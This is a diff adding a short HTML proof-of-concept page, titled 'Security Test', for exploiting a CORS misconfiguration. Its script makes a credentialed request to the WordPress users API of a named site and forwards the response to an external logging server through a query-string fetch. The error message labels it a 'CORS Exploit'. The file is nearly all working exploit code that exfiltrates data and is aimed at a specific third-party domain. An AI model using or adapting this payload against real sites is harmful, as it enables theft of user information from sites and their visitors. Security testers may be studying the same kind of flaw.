@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Security Test</title>
+</head>
+<body>
+    <h1>Testing CORS Misconfiguration</h1>
+    <button onclick="testCORS()">Run Test</button>
+
+    <script>
+        function testCORS() {
+            fetch("https://building-blocks.com/wp-json/wp/v2/users", {
+                credentials: "include"
+            })
+            .then(response => response.text())
+            .then(data => {
+                console.log("Extracted Data: ", data);
+                fetch("https://your-test-server.com/log.php?data=" + encodeURIComponent(data));
+            })
+            .catch(error => console.error("CORS Exploit Failed:", error));
+        }
+    </script>
+</body>
+</html>
